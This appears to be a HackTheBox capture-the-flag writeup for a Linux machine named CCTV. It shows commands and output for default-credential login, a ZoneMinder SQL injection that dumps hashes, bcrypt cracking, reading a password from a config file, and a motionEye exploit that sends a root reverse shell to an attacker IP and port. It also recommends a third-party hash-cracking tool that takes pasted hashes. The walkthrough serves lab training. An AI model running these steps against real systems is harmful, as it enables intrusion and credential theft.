# CCTV — HackTheBox Writeup

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Tags:** ZoneMinder, SQL Injection, BCrypt, Port Forwarding, motionEye, RCE

---

## Attack Chain

1. Nmap → ports 22 (SSH) and 80 (HTTP)
2. Web app: SecureVision → default creds `admin / admin` → ZoneMinder 1.37.63
3. CVE-2024-51482 → blind time-based SQL injection → dump user hashes
4. Crack bcrypt hash with [Password Cracker](https://github.com/ledksv/pscracker) → SSH as `mark`
5. SSH local port forward → internal motionEye on port 8765
6. `/etc/motioneye/motion.conf` → admin hash in config
7. CVE-2025-60787 → motionEye authenticated RCE → root shell

---

## 1. Enumeration

```
nmap -sV -sC 10.129.53.160 -Pn

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
```

Port 80 hosts a staff login page.

---

## 2. ZoneMinder — Default Creds & SQL Injection

Login with `admin / admin` works. ZoneMinder version **1.37.63** is visible after login.

**CVE-2024-51482** — blind time-based SQL injection via the authenticated ZoneMinder API. Must use hostname (`cctv.htb`) rather than raw IP:

```bash
python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --test
[+] Target is vulnerable!

python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --discover
[+] Found database: information_schema
[+] Found database: zm

# Dump user hashes
superadmin : [redacted]
admin      : [redacted]
mark       : [redacted]
```

---

## 3. Hash Cracking

Bcrypt (mode 3200) — slow at ~60 H/s CPU. Used [Password Cracker](https://github.com/ledksv/pscracker) — paste the hash and it auto-detects the type and runs hashcat with rockyou automatically:

```
  > [mark's bcrypt hash]

  [1] Checking encodings / ciphers... Nothing decodable.
  [2] Online lookup...             Not found online.
  [3] Identifying hash and cracking locally...
      Type : Blowfish(OpenBSD)  |  wordlist only (slow hash)
      → hashcat -m 3200

  Session: Cracked  |  Speed: ~60 H/s  |  Time: ~1 min 40 secs

  ✔  RESULT  →  [redacted]
     Method : Blowfish(OpenBSD) (hashcat)
```

---

## 4. SSH & Port Forward

SSH in as `mark` and forward the internal motionEye port:

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.53.189
```

Browse to `http://127.0.0.1:8765` → motionEye **0.43.1b4**.

Check the config for credentials:

```bash
strings /etc/motioneye/motion.conf | grep -i pass
# @admin_password [redacted]
```

---

## 5. motionEye RCE — CVE-2025-60787

motionEye <= 0.43.1b4 is vulnerable to authenticated RCE via camera config injection.

```bash
python3 exploit.py revshell \
  --url http://127.0.0.1:8765 \
  --user admin \
  --password [redacted] \
  -i YOUR_IP \
  --port 4444

[+] Payload injected. Check your listener...
```

Reverse shell lands as **root**.

---

## 6. Flags

```
User : /home/mark/user.txt  → redacted
Root : /root/root.txt       → redacted
```

---

> ⚠️ For educational purposes only. Only test systems you own or have explicit written permission to test.
